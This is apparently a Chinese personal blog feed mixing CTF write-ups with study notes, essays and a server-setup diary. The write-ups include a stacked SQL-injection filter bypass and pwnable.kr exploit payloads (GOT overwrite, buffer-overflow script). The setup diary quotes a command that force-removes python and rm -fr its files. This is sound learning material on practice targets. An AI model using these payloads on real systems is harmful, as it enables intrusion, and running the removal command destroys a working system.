    <title><![CDATA[一道存储过程绕过的SQL注入题]]></title>
    <url>%2F2019%2F07%2F04%2FSQLstore%2F</url>
    <content type="text"><![CDATA[题目来源：BUUCTF上一道强网杯的原题——《随便注》题目链接：http://web16.buuoj.cn/ 题目是一个查询，输入1，2有回显，说明存在column1，2. 输入1&#39;报错，初步判断应该是sql注入。 输入1&#39;;show tables发现有两个表，并且存在堆叠注入漏洞。 输入1&#39;;show column from 1919810931114514，发现无回显，经查询发现数字字符串需加上反引号。可以看到flag column在该表内。 直接上select想拿flag，发现被过滤下来了。 无头绪中，发现该大佬的博客，地址：https://blog.csdn.net/weixin_37839711/article/details/81562550，学会了存储过程绕过。 于是最终payload：1&#39;;sEt @a=0x73656c656374202a2066726f6d20603139313938313039333131313435313460;prepare ctf from @a;execute ctf; 存储过程绕过的原理，就是用prepare将from后面的语句暂存，该语句可以是16进制的，也可以含有参数。set 可以存储一个数值到变量里面，execute执行prepare的语句。 所以这里我们将select * from `1919810931114514`转换为16进制，然后放进set的变量里，prepare后excecute，成功执行。 为了进一步验证16进制可以执行的猜想，我们进一步测试了另外一个表words，然后…… 发现了彩蛋（逃]]></content>
      <tags>
        <tag>CTF</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[lpc的pwnable.kr日记(2)]]></title>
    <url>%2F2019%2F06%2F28%2Flpc%E7%9A%84pwnable-kr%E6%97%A5%E8%AE%B0-2%2F</url>
    <content type="text"><![CDATA[[passcode]12345678910111213141516171819202122232425262728293031323334353637383940414243#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;void login()&#123; int passcode1; int passcode2; printf(&quot;enter passcode1 : &quot;); scanf(&quot;%d&quot;, passcode1); fflush(stdin); // ha! mommy told me that 32bit is vulnerable to bruteforcing :) printf(&quot;enter passcode2 : &quot;); scanf(&quot;%d&quot;, passcode2); printf(&quot;checking...\n&quot;); if(passcode1==338150 &amp;&amp; passcode2==13371337)&#123; printf(&quot;Login OK!\n&quot;); system(&quot;/bin/cat flag&quot;); &#125; else&#123; printf(&quot;Login Failed!\n&quot;); exit(0); &#125;&#125;void welcome()&#123; char name[100]; printf(&quot;enter you name : &quot;); scanf(&quot;%100s&quot;, name); printf(&quot;Welcome %s!\n&quot;, name);&#125;int main()&#123; printf(&quot;Toddler&apos;s Secure Login System 1.0 beta.\n&quot;); welcome(); login(); // something after login... printf(&quot;Now I can safely trust you that you have credential :)\n&quot;); return 0;&#125; 这道题主要包含两个知识点： 1.scanf不加取地址符的时候，如果后面那个参数不是地址型的参数，那么就从栈中读取4个字节作为scanf取的地址。 2.GOT表覆写。关于GOT表覆写，大佬的这篇文章已经讲得很清楚了：https://blog.csdn.net/smalosnail/article/details/53247502 关于GOT表的知识，见这位dalao的博客： https://blog.csdn.net/linyt/article/details/51635768 解题思路就是，把GOT表中某个函数的地址写进栈中，以充当scanf的地址，写入的内容是system函数的地址，在该函数运行的时候，调用system函数。 payload： 12passcode@prowl:~$ python -c &quot;from pwn import *;payload = &apos;A&apos; * 96 + p32(0x0804a000) + str(0x80485e3);print(payload)&quot; | ./passcode Toddler’s Secure Login System 1.0 beta.enter you name : Welcome AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA!Sorry mom.. I got confused about scanf usage :(enter passcode1 : Now I can safely trust you that you have credential :) [random]123456789101112131415161718#include &lt;stdio.h&gt;int main()&#123; unsigned int random; random = rand(); // random value! unsigned int key=0; scanf(&quot;%d&quot;, &amp;key); if( (key ^ random) == 0xdeadbeef )&#123; printf(&quot;Good!\n&quot;); system(&quot;/bin/cat flag&quot;); return 0; &#125; printf(&quot;Wrong, maybe you should try 2^32 cases.\n&quot;); return 0;&#125; 解题关键：利用伪随机数rand()初始化时不设种子，每次都是同一个值的特点。 random@prowl:~$ ./random3039230856Good!Mommy, I thought libc random is unpredictable…]]></content>
  </entry>
  <entry>
    <title><![CDATA[lpc的pwnable.kr日记(1)]]></title>
    <url>%2F2019%2F06%2F27%2Flpc%E7%9A%84pwnable%E6%97%A5%E8%AE%B0-1%2F</url>
    <content type="text"><![CDATA[非常喜欢pwnable.kr，题目难度循序渐进，关键是界面可爱到爆QAQ 第一题 fd123456789101112131415161718192021#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;string.h&gt;char buf[32];int main(int argc, char* argv[], char* envp[])&#123; if(argc&lt;2)&#123; printf(&quot;pass argv[1] a number\n&quot;); return 0; &#125; int fd = atoi( argv[1] ) - 0x1234; int len = 0; len = read(fd, buf, 32); if(!strcmp(&quot;LETMEWIN\n&quot;, buf))&#123; printf(&quot;good job :)\n&quot;); system(&quot;/bin/cat flag&quot;); exit(0); &#125; printf(&quot;learn about Linux file IO\n&quot;); return 0;&#125; 这就是一个很简单的传参问题，argv数组接受main函数（也就是运行程序时后面带的参数），按照题目要求传参，fd为1作为read的第一个参数，buf接收LETMEWIN即可。 fd@prowl:~$ lsfd fd.c flagfd@prowl:~$ ./fd 4662LETMEWINgood job :)mommy! I think I know what a file descriptor is!! 第二题 collision12345678910111213141516171819202122232425262728293031#include &lt;stdio.h&gt;#include &lt;string.h&gt;unsigned long hashcode = 0x21DD09EC;unsigned long check_password(const char* p)&#123; int* ip = (int*)p; int i; int res=0; for(i=0; i&lt;5; i++)&#123; res += ip[i]; &#125; return res;&#125;int main(int argc, char* argv[])&#123; if(argc&lt;2)&#123; printf(&quot;usage : %s [passcode]\n&quot;, argv[0]); return 0; &#125; if(strlen(argv[1]) != 20)&#123; printf(&quot;passcode length should be 20 bytes\n&quot;); return 0; &#125; if(hashcode == check_password( argv[1] ))&#123; system(&quot;/bin/cat flag&quot;); return 0; &#125; else printf(&quot;wrong passcode.\n&quot;); return 0;&#125; 输入20个char型的，在check_password里转成int型的，原来一个字符指针对应一个字节，现在变成int指针对应4个字节，长度为5，刚好满足循环累加，加起来要等于0x21DD09EC。 4个字符存一个16进制的int。hashcode = 4*a+b = 16*char+b。 0x21DD09EC = 0x01010101*4+0x1dd905e8 考虑小端序，payload为 1`python-c &quot;print &apos;\x01&apos; * 16 +&apos;\xE8\x05\xD9\x1D&apos;&quot;` col@prowl:~$ ./col `python -c “print ‘\x01’ * 16 +’\xE8\x05\xD9\x1D’”`daddy! I just managed to create a hash collision :) 第三题 bof123456789101112131415161718#include &lt;stdio.h&gt;#include &lt;string.h&gt;#include &lt;stdlib.h&gt;void func(int key)&#123; char overflowme[32]; printf(&quot;overflow me : &quot;); gets(overflowme); // smash me! if(key == 0xcafebabe)&#123; system(&quot;/bin/sh&quot;); &#125; else&#123; printf(&quot;Nah..\n&quot;); &#125;&#125;int main(int argc, char* argv[])&#123; func(0xdeadbeef); return 0;&#125; 拖进ida，func函数里面，overflowme的地址为ebp-2c，key的地址为ebp+8，0x2c + 0x8 = 52。 简单的栈溢出，payload如下： 12345# -*- coding:utf-8 -*- import pwnr = pwn.remote(&apos;pwnable.kr&apos;,9000)r.send(&apos;a&apos;*52+pwn.p32(0xcafebabe))r.interactive() 第四题 flag拖进ida，找不到main函数的入口点，根据题目提示reverse，估计加壳，peid查壳发现upx，kali upx -d 脱壳，再拖进ida即可发现flag。]]></content>
  </entry>
  <entry>
    <title><![CDATA[2019信安国赛部分wp]]></title>
    <url>%2F2019%2F04%2F23%2F2019%E4%BF%A1%E5%AE%89%E5%9B%BD%E8%B5%9B%E9%83%A8%E5%88%86writeup%2F</url>
    <content type="text"><![CDATA[​ 人生中第一次参加信安国赛……之前是偶尔打打CTF的菜鸡，不太知道自己的斤两，这次国赛让我见识到什么是神仙打架。 ​ 比较菜，没做出几道题，写个wp，权当自己复习纪念。 ​ 不够啊，还要努力。 签到下载题目花了5分钟（即使我是尊贵的百度云vip会员）。突然榜上一分钟内就有大佬做出来了？（一定是我钱充得不够） 拿到题目一看，三人行，必有flag。打开题目，一个摄像头，可以捕捉脸部（出现小框框的那种），联想到三人行，就三个人一起看摄像头。当时比较simple，把控制台最小化了，弄半天没反应，最后气急败坏要关闭题目的时候，看见控制台里的flag。 签到完成。 babypwn这题一开始以为是简单题，太乐观了。直接栈溢出后。。。额，就找不到可以利用的点了，找不到system、write，找不到int 80 gadget，无从下手。打算直接给read加上libc的system偏移，尝试一波后放弃。然后在网上找了找解决方案好久，看到一道类似的题，是2017年的文章，（https://veritas501.space/2017/04/23/32%E4%BD%8D%E4%B8%8B%E8%8A%B1%E6%A0%B7read_write/）是说把got表里的read低字节覆盖成syscall地址，然后看大概的代码结构也和题给的差不多，似乎出题人就是把这道题稍微改了一下。然后我复现了一下这道题，整个跳csu_init，写bin/sh，跳plt_read的过程还好，就最后一个覆盖低字节\xdc很迷。 以为偏移指的是函数间的偏移，发现偏移都差距好大，觉得是libc不同的过。好久才醒悟过来syscall的偏移是在read函数内的，然后就确定偏移的确是\xdc了，然后就是把eax、ebx的相应参数都设置好，用两个gadget。之后以为能成功，但本地一直报段错误，不知道为啥。想碰碰运气试远程结果成功了。 写的脚本： puzzles根据likes提示格式，我们开始一步一步地解。 question0是一个一元多阶多项式方程组，不多说，上matlab： question1发现都是奇数，等比数列无果后操作了一波发现是质数。于是，依然matlab： 发现是不连续的质数，然后查看了一波质数的位置，发现第一个在1645834位，第三个在1645908，第四个在1645945，等差数列，于是第三个质数为1645908。 question2依然matlab： 定积分公式 question3物理题 网上找到了原题，改下数字，带公式计算。 question4数学题 依然matlab： 最后把几个part转换成16进制，拼接起来，得到flag saleae下载下来是一个logicdata后缀的文件，不知道的后缀名先百度一波。发现有这样一篇文章（https://www.waitalone.cn/security-hardware-usb.html），发现要用到一个叫saleae logic的软件，再联想到题目，就很顺理成章了。 去官网下载一波，打开，发现是三个波形，一开始我们以为是条形码。 于是就开始疯狂的扫扫扫，然鹅： 后来仔细观察了下波形： channel0这规律的波形，这熟悉的律动。联想到学过的数电的时钟信号 ，想到了时序分析。所以analyze采用SPI时序分析。时钟设为channel0，使能端用channel3，channel1没有起伏可以不用管，channel0是被分析的所以设为MOSI，于是乎： 右下角得到分析结果，0x66是字符‘f’，0x6c是字符‘l’，flag出来了。 usbasp操作内容有了昨天物联网那道题的经验，依旧用saleae打开。 channel2放大后看起来比较有规律。尝试用channel2做时钟端口，channel1和0做被分析，channel3做使能端。发现好像不行 然后看到题目，联想到用usb协议，发现依旧不行。 然后抱着试一试的心态和认定0x66和0x6c的心态去试了下每个协议，终于，在时序分析spi时，把使能端的设置改一下 然后惊喜地发现了0x66，于是转换一下，即得flag。]]></content>
      <tags>
        <tag>CTF</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[汇编语言学习心得（二）：Debug、DS寄存器、字]]></title>
    <url>%2F2019%2F02%2F05%2F%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80%E5%AD%A6%E4%B9%A0%E5%BF%83%E5%BE%97%EF%BC%88%E4%BA%8C%EF%BC%89%EF%BC%9ADebug%E3%80%81DS%E5%AF%84%E5%AD%98%E5%99%A8%E3%80%81%E5%AD%97%2F</url>
    <content type="text"><![CDATA[在王爽老师的《汇编语言》一书中，提到了debug这一工具。Debug是dos和windows都提供的一种程序调试工具，使用它，可以查看寄存器和内存的内容。并且可以修改，写入，执行汇编、机器指令。 Win10的电脑已经不再支持command指令和debug工具，方法一是在网上下载dosbox以及debug.exe配合使用。也可以采用vmware+windowsxp的虚拟机来使用debug工具。接下来枚举一下debug的主要指令以及功能。 -r 该命令用来显示、改变寄存器的内容。如 -r ax 可以改变寄存器ax的内容，也可以-rax不带空格。 -d 该命令用来显示内存中的内容，默认显示左下角地址为起始位置的128个内容。后面可接地址，如-d 1000：0，则显示段地址为1000，偏移地址为0的起始地址的内容。 -e 该命令用于修改内存中的内容，后接地址，格式同-d命令。 -u命令可将内存中的机器指令翻译成汇编指令，默认为左下角地址所指内存。可指定内存，格式同-d命令。 -t 命令可执行一条机器指令，执行的命令为CS 和IP中的地址指向的命令，后面不可指定地址。 -a 命令可以向内存中以汇编指令的形式写入指令，默认为-r左下角地址，可指定地址，格式同-d命令。 在写入命令时，既可以用-e直接修改内存中的机器码，也可以用-a写入汇编代码。写入内存地址后，-t执行的是CS IP中的地址，所以要先用-r命令修改CS IP为待执行地址，再使用-t执行。 字由两个字节构成，所以在8086CPU中，每个字用16位寄存器储存。高位放在高地址单元，低位则放在低地址单元里面。 8086CPU里面，有一个寄存器叫做DS（段寄存器），用于存放数据的段地址。CS也是段寄存器，不过为了区分，CS段寄存器专门用来存放指令，而DS存的是不可执行的数据。 当执行汇编指令 mov AX,[1]时，中括号内的内容其实是当前的偏移地址，那么如何确定段地址呢？此时的段地址即为DS寄存器内存储的地址。 当修改段寄存器的地址时，我们容易想到使用 MOV DS,3333H的语句。这样的操作叫做“立即寻址方式”，被传送的数据叫做立即数。但实际上这样做是非法的，因为CPU不支持直接将立即数送入段寄存器。Google给出的原因是由于立即数直接写入段寄存器这样的指令，被翻译成机器码之后将占用更多的字节，在事先规定的指令长度范围内无法存贮下这么多的内容，因此改由先写入通用寄存器，再由通用寄存器写入段寄存器的办法代替。立即数实际上是相当占地方的。只能通过间接迂回的方式。MOV AX,3333H MOV DS,AX。先将数据送入一般寄存器，再把一般寄存器的值送入段寄存器。 数据从寄存器到内存地址的方式是内存地址到寄存器的逆过程，只需MOV [0],AX即可。 因为8086CPU是16位结构，可以一次性传输16位数据，也就是一个字的数据。]]></content>
  </entry>
  <entry>
    <title><![CDATA[优美的舞姿--探索正则表达式（一）：字符组、量词初步]]></title>
    <url>%2F2019%2F02%2F04%2F%E4%BC%98%E7%BE%8E%E7%9A%84%E8%88%9E%E5%A7%BF-%E6%8E%A2%E7%B4%A2%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F%EF%BC%88%E4%B8%80%EF%BC%89%EF%BC%9A%E5%AD%97%E7%AC%A6%E7%BB%84%E3%80%81%E9%87%8F%E8%AF%8D%E5%88%9D%E6%AD%A5%2F</url>
    <content type="text"><![CDATA[前几天看《编译与反编译原理》，词法分析器的编写用到了正则表达式；以前写爬虫，对获取到的庞大的数据进一步地筛选，提取有用信息，也是离不开正则表达式。一直以来对正则都是一知半解，这几天，读了余晟老师写的《正则指引》，颇有心得，取其主干和精彩处总结一下，权当自己复习。 正则表达式，又称为规则表达式，英语是Regular Expression，所以常常简写为RE。最早是用在unix指令sed和grep里。Grep，G、re、p，中间的re正是指正则表达式。 认识正则表达式的第一步，是认识字符组。它表示在同一位置可能出现的各种字符。常常包含在一对方括号[]之间。而方括号中的内容则表示要匹配的内容。如[123]则匹配数字1，2，3。[a,b,c,d,e,f,g]则匹配字母a,b,c,d,e,f,g。 那么当要匹配的范围扩大，比如要匹配所有的字母，总不能把所有的单词全部写一遍吧。我们知道，每个ASCII字符都能对应一个ASCII码。所以，我们只需要按照ASCII码的顺序并结合‘-’符号构造一个范围表达式，如[0-9]就代表所有的数字，[a-zA-Z]就代表所有的英文大小写字母。然而当‘-’符号并不是作为两个ASCII字符的连接符时，则保持原有的意思，如[-09]代表匹配数字0，9以及符号‘-’。 如果我们要匹配不为A的所有字符呢？这时候用一个排除型字符组就可以解决。排除型字符组和普通字符组最大的不同是含有一个脱字符‘^’，如，不含A的所有字符可以表示为[^A]。 正则表达式的字符组本质上是一个集合，所以可以进行集合的运算。如，进一步，我想匹配不为F的所有大写字母，则可以写作[A-Z-[\^F]],即从A-Z匹配到的大写字母的集合里面，进行差集运算，减掉字母F。 特殊字符组：POSIX字符组。以及PCRE简记法。如[0-9]在POSIX字符组里面可以表示为[:digit:]，在PCRE里面简记为\d。常用的简记还有\s（空白字符），\w（字母字符）。 而简记法字符的排除型可以用他们的大写形式来表示，如：\S表示不为空白字符的所有字符。因此，我们可以用[\s\S]、[\W\w]、[\D\d]来表示所有字符（突然想起sql注入的时候为了绕过等号采用&lt;&gt;号，原理大同小异）。有的时候还可以用’.’字符来匹配，然而点字符无法匹配换行符。 一个字符组匹配一个空位的字符，那么，当我们要匹配多个字符时，如果将字符组重复写多次，未免显得太笨拙繁琐。正则表达式为我们提供了一个量词符号{}。如\d{4}代表匹配数字4次，等价于\d\d\d\d。同样，{}符号可以写成范围形式，代表匹配左闭右闭区间的范围次数，如{5,6}，则代表匹配5次或6次。有趣的是，这个区间可以单独缺少上区间或者下区间。如{5,}代表匹配不止5次，{,6}代表匹配最多6次，最少0次，但在有些语言下不适用，应该注意。 同样，量词也提供了简单写法，如+符号代表匹配不止1次，等同于{1,}，*符号代表匹配大于等于0次，等同于{0,}，？则代表匹配0次或1次，等同于{0,1}。 在严格匹配字符串的长度，以及要求一一相等时，应该采用^$符号，表示从字符串首匹配到尾。 之前提到匹配任意字符串时，可以采用’.’符号，然而点符号并不能匹配换行符\n，除非在单行匹配模式下。同时，点号时匹配优先词，采用的是贪婪模式匹配，所以在一些情况下可能会出现问题。 下一篇将探索贪婪模式与非贪婪模式匹配。]]></content>
  </entry>
  <entry>
    <title><![CDATA[汇编语言学习心得（一）：CPU,寄存器]]></title>
    <url>%2F2019%2F02%2F03%2F%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80%E5%AD%A6%E4%B9%A0%E5%BF%83%E5%BE%97%EF%BC%88%E4%B8%80%EF%BC%89%EF%BC%9ACPU-%E5%AF%84%E5%AD%98%E5%99%A8%2F</url>
    <content type="text"><![CDATA[汇编语言是怎么产生的？汇编语言是机器指令的助记符，与机器指令一一对应。而对不同的CPU来说有不同的汇编指令集。显然，机器语言虽然高效，但是难以让人理解，可读性和查错性都不强，所以才出现了中间语言——汇编语言。 寄存器是CPU中存储数据的器件，一个CPU可以有多个寄存器。寄存器又有自己的代号，如AX,BX。说到数据，在内存和磁盘上，指令和数据的区别并不大，本质上都是作为二进制存储，但是CPU工作的时候，指令和数据则有不同的意义。 存储器包含若干个存储单元，每个单元从0开始编号。一个单元存储8bit，也就是一个字节Byte。但是在量度存储器的容量时，常常用字节作为最小的单位。CPU在读写存储器时，是按照：寻址——选择控制——读写的顺序进行工作的。而参与这一过程的主角——三条线：地址线、数据总线、控制总线，它们的作用分别如下： 地址线：CPU含有地址线的数量称为地址总线的宽度，于是寻址的范围就是2的宽度次方个存储单元。数据总线：一根数据总线对应一个二进制位（1bit），8根数据总线可以传输一个字节。控制总线：宽度决定CPU对外部器件的控制能力。 而可寻内存单元构成的叫做CPU的内存地址空间，分别由两个字节组成：高位字节和低位字节。 前面我们谈到不同的CPU对应不同的汇编指令，以及不同的寄存器数量。在这里我们着重介绍一种重要的CPU：8086CPU。 8086CPU由20位地址总线组成，具有1MB寻址能力。16位结构，一次性处理传输暂存的数据位16位。内部则用两个16位地址（段地址和偏移地址）通过地址加法器合成一个20位的物理地址。合成方式为：16*段地址+偏移地址。充分体现了用两个少位单元代替多位单元的思想。同时，正因为这个物理地址一个合成的地址，所以可以有不同的段地址和偏移地址的组合方式。 段地址和偏移地址是怎样暂时存储的呢？这里有两个重要的寄存器：CS寄存器和IP寄存器。前者储存段地址，称为代码段寄存器，后者储存偏移地址，称为指令指针寄存器。所以，我们基本上可以想象出执行一条指令的全过程了：CS和IP中的值送入地址加法器，计算出物理地址：16*CS+IP，然后用得到的物理地址传入输入输出控制器，通过地址总线寻找到指令的首地址，然后通过数据总线送回来，再送入指令缓冲器，这时候，我们的IP寄存器加上代码段长度的地址长度，指向下一个指令后，再执行当前指令，执行完后进入下一个循环，周而复始。 由此，我们知道，读取指令，不过就是改变CS和IP的值，使物理地址指向我们想要读取的指令集。那么怎么改变CS和IP的值呢？用MOV指令可以吗？ 我们知道，MOV可以修改寄存器AX，BX等寄存器的值，然而，在8086CPU中，MOV指令不能直接修改CS、IP内容，因为MOV指令叫做传送指令，只能通过执行指令前完成IP加上代码段长度这一个自增过程实现间接改变IP寄存器的值。能直接修改CS,IP的指令叫做转移指令，如JMP。 格式为JMP 段地址：偏移地址。 若仅仅修改IP内容，就用jmp 寄存器（AX,BX） 这一格式的语句。寄存器的值作为IP的新值。所以从某种意义上来说，jmp ax等同于mov ip ax。]]></content>
  </entry>
  <entry>
    <title><![CDATA[年]]></title>
    <url>%2F2019%2F01%2F30%2F%E5%B9%B4%2F</url>
    <content type="text"><![CDATA[我越来越不喜欢过年。 上下半年的纷忙，年前的疲累，似乎不妨碍人们把最后的力气在热闹里燃尽。西门的灯笼挂起来了，遮住了整条街的穹顶，连梧桐与黄槲的阴影都要比往日更加分明。门庭变得热闹，往日希有来往的亲朋也纷至赴这盛宴。 这热闹表面上粉饰得红火，骨子里却是冷清的，冷到眼角发红，瞳孔扩张。它是三大姑嘴里发了横财锦衣夜行的某某，又是八大舅饭桌上吐出的将散未散的烟圈，是彻底忘却陈年的酒盏，终究在中年男人夹杂着咒骂的酒嗝中烟消云散。 这几天小雨。 一个人在家，或沉默，或翻着老物件自言自语。孩提时代不知被哪位长辈告诫，自言自语的小孩长大后会变成街上的疯子，这一点我当时确信不疑的。直到后来才知道不过是大人教小孩学会倾诉的一个计俩。只不过小时候那点心事谁都能付之衷肠，反倒是长大后自言自语的时候多了，于是我便很难分辨自己是否仍然正常。 人们为什么喜欢过年，是偏爱热闹，抑或是在那推杯换盏中忘却陈年？于是那咒骂声也仿佛立马有了现代极简主义感。我翻着这些或新或旧的礼物，字迹已然不清的贺卡，瓷储蓄罐，去年收到的一幅画。科学说人们会选择性地忘掉悲伤的回忆，男人告诉你忘不掉的能借助酒精，女人说还有口红和包。我已经大半年不饮一滴酒，我想我最好还是保持清醒。 比起过年，年终总结好像是个不错的替代方案。 好了，我要提笔了，诸君请看。可是，从何说起呢？上半年的事我大抵已经记不清了，下半年又太过压抑。这的确是很重要的半年，始于期待与一场狂喜，结束于疲惫与怅然。我在等待了一度春秋，等到那夏露结成一颗明珠，我攥了一整颗终于在孟秋失去，再不复得。深秋初冬的忙碌是密不透风的棺材板，当我终于从那板子里脱出，也快要忘却那盛夏的光景时，我的输入法还记得，它一遍又一遍地用曾经最平常不过的字眼来鞭挞我的心，痛斥我曾轻浮与薄情;歌单记得，便签纸记得，礼品记得，空间里我曾写下的那些稚气煽情的句子，全都还记得。 我于是终于还是向年妥协，斟一杯消愁的酒，就让这一年的光景全都熄灭在你迷离的醉眼里罢。]]></content>
  </entry>
  <entry>
    <title><![CDATA[我与Lamp模式建站的恩怨情仇]]></title>
    <url>%2F2019%2F01%2F14%2F%E6%88%91%E4%B8%8ELamp%E6%A8%A1%E5%BC%8F%E5%BB%BA%E7%AB%99%E7%9A%84%E6%81%A9%E6%80%A8%E6%83%85%E4%BB%87%2F</url>
    <content type="text"><![CDATA[很久没有更新我的博客，前几天网站突然不能访问，在排查原因无果之后，决定初始化我的磁盘，重新搭建我的博客。我是个爱折腾的人，当然循规蹈矩地安装lamp搭建博客基本上驾轻就熟，这一次我决定解决上次建站遗留下来的几个坑： 1.上次建站用的是centos自带的yum源，php5，apache2.4.6，以及mysql5，这一次我决定统一换成php7+mysql8。2.网站https化。3.让网站更加安全。 物料： 1.云服务器一台（centos系统）2.Typecho博客最新稳定版安装包一个3.手和脑子 首先，更新系统好习惯 sudo yum install update sudo yum install upgrade 接下来，配置防火墙我的感受就是：不要图省事直接关防火墙！虽然阿里云服务器防D防扫功能已经做得很好了，但是风险还是存在的。开启防火墙服务： systemctl start firewalld查看防火墙状态： systemctl status firewalld开机启动：systemctl enable firewall Tips：systemctl的这三个指令在centos7+版本改变服务状态很有用，可以记一记。 接下来，进行Apache的安装这里，我偷懒就直接yum install httpd了,这时候安装下来的是centos自带的apache2.4.6版本，不过，这里的省事也给我之后造成了不小的麻烦。 安装完成之后，我们开启apache服务 service httpd start 查一波状态 service httpd status 如果看到一个绿色的running小圆点，就说明服务搭建好了，这时候我们访问我们的公网ip，就能看见喜闻乐见的apache running 的页面了。 接下来，进行mysql的安装没有直接yum install，而是去官网下载了mysql最新版的rpm源然后执行rpm -ivh进行安装 然后它告诉你mysql的默认缺省密码的存储位置，我们直接cat拿到密码，然后 mysql -u -root 输入密码，然后重新为数据库设置新的密码。 完成后，我们新建一个名为typecho的数据库 Create database typecho 然后使用grant privilege赋权exit～ 那么mysql服务就安装到这里。 接下来安装phpYum源提供的php是5.7版本的，但是我选择去官方源下载php7的版本，这里安装方式不再赘述，网上一搜一大把。 下载typecho去typecho官方网站wget下载最新稳定版安装包，tar解压，再把build文件夹里面的东西mv到/var/www/html 目录下。 这时候，访问公网ip，看到安装程序，一切正常。 我们的坑正式来了。 第一个坑：连不上数据库 数据库创建了，死活连不上，让你检查配置。我们打开myql数据库 use mysql; select user,plugin from user ; 我们可以看到，列出来的用户里面，加密方式为caching_sha2_passwordTypecho默认数据库连接不支持sha2加密方式，我们改为native加密模式 ALTER USER &#39;root&#39;@&#39;localhost&#39; IDENTIFIED WITH mysql_native_password BY &#39;root&#39;; 然后修改密码 第一个坑顺利解决 安装完网站，进后台，进行各种设置，这时候，看到我们的域名http://wutongdeng.cn作为一名资深强迫症患者，chrome和火狐再给我丢一个不安全，就十分难受。不用说，https化。上次搭建因为mysql版本问题没能成功解决（一个很奇怪的报错条件）开始。我首先选择的是certbot，一个免费证书颁发网站（白嫖党上线）。网站虽然是英文的，但是有点英语基础安装起来没有困难，况且每一步的安装命令都给了，我们ctrl c ctrl v就能解决（额好吧，linux应该shift insert）。抱着这种心态，一路配置下去，突然卡在了 sudo yum install python2-certbot-apache 这一步上。安装的过程始终报错，后来才发现是python版本冲突的问题，这时候我想都没想干了一件蠢哭自己的事情 rpm -qa|grep python|xargs rpm -e --allmatches --nodeps whereis python|xargs rm -fr 然后我们再whereis python没有回显，说明python卸载干净了，我们再高高兴兴地sudo yum install python2-certbot-apache这时候，屏幕显示，yum不可用了。网上一查，yum和python有千丝万缕的联系，删除了python，yum就不能正常使用。喵喵喵？一个基于yum仓库，一个基于pip仓库，你俩怎么就有py关系了？虽然不服，还是接受了事实，决定把yum和python都删得干干净净然后重新安装。方法是去阿里云，163,以及ustc或者清华的镜像站去找rpm源，方式也是wget +rpm有依赖关系的要放在一块儿安装。恢复之后，sudo yum install python2-certbot-apache成功，然后接着 yum-config-manager --enable rhui-REGION-rhel-server-extras rhui-REGION-rhel-server-optional 这时候，系统提示，找不到yum-config-manager。网上找了大部分方法都没有解决这个问题，我干脆就直接把虚拟机上同版本的centos系统里的yum-config-manager拷贝过来。再执行命令，成功。 然后sudo certbot --apache 按照提示配置证书，这时候配置完了之后，又回显失败了。排错了很久也没有找到原因（感觉可能和我卸载yum和pip重装有关系） 我再次投向了腾讯爸爸的怀抱。 登录腾讯云平台，申请ssl证书，按照它的步骤走，什么放密钥在根目录，十分清晰明了。认证很快，邮件通知，然后到平台上下载你的证书文件进入/etc/httpd/conf.d 修改ssl.conf文件，把里面证书文件的缺省名称换为你的证书文件的位置，并且正确放置证书。重启apache服务，这时候我们可以看到网站已经能够https访问了，但是仍然能够以http的方式访问，显然不够完美。我们修改/etc/httpd/conf 里面的http.conf 文件，把网站根目录的overwrite功能打开（网上大部分的教程都是rewrite，但我死活没有找到，可能apache的版本导致的）这时候，我们利用rewrite功能在根目录写一个.htaccess文件如下： &lt;IfModule mod_rewrite.c&gt; Options +FollowSymlinks -Multiviews RewriteEngine On RewriteCond %{SERVER_PORT} 80 RewriteRule ^(.*)$ https://%{SERVER_NAME}/$1 [R=301,L] RewriteCond %{REQUEST_FILENAME} !-d RewriteCond %{REQUEST_FILENAME} !-f RewriteRule ^(.*)$ index.php [L,E=PATH_INFO:$1] &lt;/IfModule&gt; 文件会监听80端口，并且301重定向到https的网站，重启apache服务，输入http的域名，成功定向到https的域名。至此，https化成功。 那么如何让你的博客更加安全呢？为此，我做了以下几个改变：1.改变网站后台文件地址（名称需要非常复杂），并且设置ip白名单。2.网站目录重命名，并且apache配置禁止访问3.全站开启静态化。4.伪造了一个假的admin页面，用于愚弄脚本小子们。（之后想进一步学习蜜罐陷阱的布置方法，也算是开了一个小头了吧。） 2019年1月14日傍晚]]></content>
  </entry>
  <entry>
    <title><![CDATA[旧曾谙]]></title>
    <url>%2F2018%2F11%2F19%2F%E6%97%A7%E6%9B%BE%E8%B0%99%2F</url>
    <content type="text"><![CDATA[北京的冬天总是来得很早。故乡的旧时光里，秋凉一定是伴着满城花香而来，知了的噤声渐默，秋天消逝，以黄叶在风中缓缓下坠的姿态离去。北京的秋却截然不同：它在几阵凌冽的风席掠后逃逸，甚至来不及施舍一场薄雪留下脚印痕。 暖气是北京在冬天里得以与南方抗衡的最后的倔强。虽然免于寒冷的侵袭，本来干燥的空气，因此更加拧不出一点水来。我烦热极了，终于在某一天的夜幕里驱车驶出了学校大门，我没有方向，往拥挤的人群里骑，往最繁华的商业区骑，往最冷清的废草坪骑，累了便回去。 行过许多熟悉的地方，突然想起一年前每个初冬的夜晚，我曾在这座天桥上面对着这座城市的川流不息漫唱，这块儿河边的树林里我曾经录过歌，我受冻而颤抖的声音与风声巧妙地合拍。地点，骑车的人和他的行为，一切仿佛都没有变过，就好像我重复这一切，我就能一步穿越回去年的今天。 但我不愿重复。这一年来的种种，并不因我的一厢情愿而抹去。所以有时幻想，回忆如何不能像这座城市的秋天一般，在北风卷地的势不可挡里，如同百草一般消逝。这固然是不现实的，即使我挫骨扬灰从世界的账本里清零，我生前的种种善恶，也终将成为促成世界大风球的蝴蝶效应的因子。 遗憾的是，没能走过所有熟悉的地点，我的肢体告诉我它已然疲累。若我还是一年前的我，一定会感到意外的。体能不会说谎，岁月也是。人生挂历的十位在悄然翻页，我也无颜去争辩自己是否还是十年前的少年。 